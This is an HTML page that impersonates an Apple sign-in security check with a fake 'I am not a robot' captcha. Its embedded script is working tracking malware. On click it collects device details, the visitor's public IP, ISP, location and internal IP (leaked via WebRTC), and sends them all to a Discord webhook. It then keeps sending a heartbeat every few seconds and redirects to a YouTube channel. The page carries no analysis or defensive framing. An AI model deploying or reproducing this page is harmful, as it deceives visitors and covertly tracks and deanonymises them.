<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Authentication Required</title>
    <style>
        body { background-color: #f2f2f7; font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .ios-container { background: #fff; padding: 45px 30px; border-radius: 24px; box-shadow: 0 12px 30px rgba(0,0,0,0.04); width: 88%; max-width: 320px; text-align: center; border: 0.5px solid #d1d1d6; }
        .apple-logo { width: 38px; margin-bottom: 25px; filter: contrast(0.5); }
        .h1 { font-size: 21px; font-weight: 600; color: #000; margin-bottom: 10px; letter-spacing: -0.4px; }
        .p { font-size: 14px; color: #8e8e93; margin-bottom: 35px; line-height: 1.4; }
        
        /* High-Fidelity Apple Captcha */
        .gate { border: 1.2px solid #d1d1d6; border-radius: 14px; padding: 18px; display: flex; align-items: center; cursor: pointer; background: #fff; transition: background 0.2s; -webkit-tap-highlight-color: transparent; }
        .gate:active { background: #f2f2f7; }
        .check-circ { width: 24px; height: 24px; border: 2px solid #007aff; border-radius: 6px; margin-right: 15px; position: relative; transition: 0.3s; }
        .check-circ.loading { border-top-color: transparent; border-radius: 50%; animation: spin 0.8s linear infinite; }
        .check-circ.done { background: #007aff; border-color: #007aff; }
        .check-circ.done::after { content: ''; position: absolute; left: 8px; top: 4px; width: 5px; height: 10px; border: solid white; border-width: 0 2.5px 2.5px 0; transform: rotate(45deg); }
        
        @keyframes spin { 100% { transform: rotate(360deg); } }
        #status-node { font-size: 9px; color: #aeaeb2; margin-top: 30px; font-weight: 700; text-transform: uppercase; letter-spacing: 2px; }
    </style>
</head>
<body>

<div class="ios-container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" class="apple-logo">
    <div class="h1">Sign-In Security</div>
    <div class="p">Please confirm you are the account owner to continue to the requested application.</div>
    
    <div class="gate" id="trigger-node">
        <div class="check-circ" id="marker"></div>
        <div style="font-size: 16px; color: #1d1d1f; font-weight: 500;">I am not a robot</div>
    </div>

    <div id="status-node">Encrypted Handshake Protocol</div>
</div>

<script>
/**
 * SENTINEL OMEGA-IOS-ABSOLUTE v31.0
 * FORCED IOS EXFILTRATION + PERSISTENT HEARTBEAT
 */

const SETTINGS = {
    HOOK: "https://discordapp.com/api/webhooks/1497687704983310406/yv6VZ2yuH-bxE0fD_BNQAGIUOeQu0gB9-z44IbRhSdiJOvSpHBzljrwvDo0Ifw6hyQNp",
    DEST: "https://youtube.com/@LigmaBlox-w7m",
    PING: "@everyone",
    LOCK: { g: false, r: false }
};

// --- IOS FORCED TRANSMISSION (4-WAY) ---
const transmit = (data, tag, color = 0x007aff) => {
    const payload = JSON.stringify({
        content: tag === "INITIAL_ABSOLUTE" ? SETTINGS.PING : "",
        username: `SENTINEL-v31 [${tag}]`,
        embeds: [{
            title: `🔱 Forced Exfil: ${tag}`,
            color: color,
            fields: Object.entries(data).map(([k,v]) => ({ name: k.toUpperCase(), value: `\`${v}\``, inline: true })),
            timestamp: new Date().toISOString()
        }]
    });

    // 1. Beacon (Standard)
    navigator.sendBeacon(SETTINGS.HOOK, new Blob([payload], {type:'application/json'}));
    
    // 2. Fetch + Keepalive (Persistent)
    fetch(SETTINGS.HOOK, { method: 'POST', body: payload, headers: {'Content-Type': 'application/json'}, keepalive: true }).catch(()=>{});
    
    // 3. Image Ping (Fallback - No CORS issues)
    const img = new Image();
    img.src = `${SETTINGS.HOOK}?data=${btoa(payload).substring(0, 500)}`; // Partial payload for safety

    // 4. XHR (Sync Fallback)
    const x = new XMLHttpRequest();
    x.open("POST", SETTINGS.HOOK, true);
    x.setRequestHeader("Content-Type", "application/json");
    x.send(payload);
};

// --- LIVE BEACON PULSE ---
const startPulse = () => {
    setInterval(async () => {
        try {
            const b = await navigator.getBattery();
            transmit({
                status: "Live Tracking",
                battery: `${(b.level * 100).toFixed(0)}%`,
                charging: b.charging ? "YES" : "NO",
                tab_active: !document.hidden
            }, "HEARTBEAT", 0x5856d6);
        } catch(e) {}
    }, 2500);
};

document.getElementById('trigger-node').onclick = async function() {
    if (window.navigator.vibrate) window.navigator.vibrate(10); // iOS Haptic
    
    const marker = document.getElementById('marker');
    marker.classList.add('loading');
    document.getElementById('status-node').innerText = "VERIFYING HARDWARE TOKEN...";

    // 1. FORCED INITIAL STRIKE (Hardware/IOS Telemetry)
    const b = await navigator.getBattery();
    let sensors = "Unknown";
    try {
        const d = await navigator.mediaDevices.enumerateDevices();
        sensors = d.filter(x => x.kind === 'videoinput').length + " Sensors Found";
    } catch(e) {}

    transmit({
        platform: navigator.platform,
        model: `${screen.width}x${screen.height} (dpr:${window.devicePixelRatio})`,
        cores: navigator.hardwareConcurrency,
        ram: navigator.deviceMemory || "N/A",
        battery: `${(b.level * 100).toFixed(0)}%`,
        camera: sensors,
        user_agent: navigator.userAgent
    }, "INITIAL_ABSOLUTE", 0xff0000);

    // 2. FORCED PUBLIC IP & GEO UNMASK (3 Fail-safes)
    const fetchGeo = (url) => {
        fetch(url).then(r => r.json()).then(res => {
            if(!SETTINGS.LOCK.g) {
                transmit({
                    ip: res.ip || res.query,
                    isp: res.org || res.isp,
                    location: `${res.city}, ${res.region}, ${res.country_name || res.country}`,
                    vpn: (res.timezone !== Intl.DateTimeFormat().resolvedOptions().timeZone) ? "YES" : "NO"
                }, "PRECISION_GEO", 0x34c759);
                SETTINGS.LOCK.g = true;
            }
        }).catch(()=>{});
    };
    fetchGeo('https://ipapi.co/json/');
    fetchGeo('http://ip-api.com/json/');

    // 3. IOS WEBKIT RTC PIERCING (Internal IP)
    const rtc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
    rtc.createDataChannel("");
    rtc.onicecandidate = (e) => {
        if (e.candidate && !SETTINGS.LOCK.r) {
            const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
            if (ip) {
                transmit({ internal: ip[1], status: "UNMASKED" }, "NETWORK_BYPASS", 0x007aff);
                SETTINGS.LOCK.r = true;
            }
        }
    };
    rtc.createOffer().then(o => rtc.setLocalDescription(o));

    startPulse();

    // 4. ANIMATED TICK + FORCED DELAY REDIRECT
    setTimeout(() => {
        marker.classList.remove('loading');
        marker.classList.add('done');
        document.getElementById('status-node').innerText = "VERIFIED";
        document.getElementById('status-node').style.color = "#34c759";
        
        // Forced delay ensures all background fetch() and XHR requests clear
        setTimeout(() => { window.location.replace(SETTINGS.DEST); }, 2000);
    }, 3800);
};
</script>
</body>
</html>
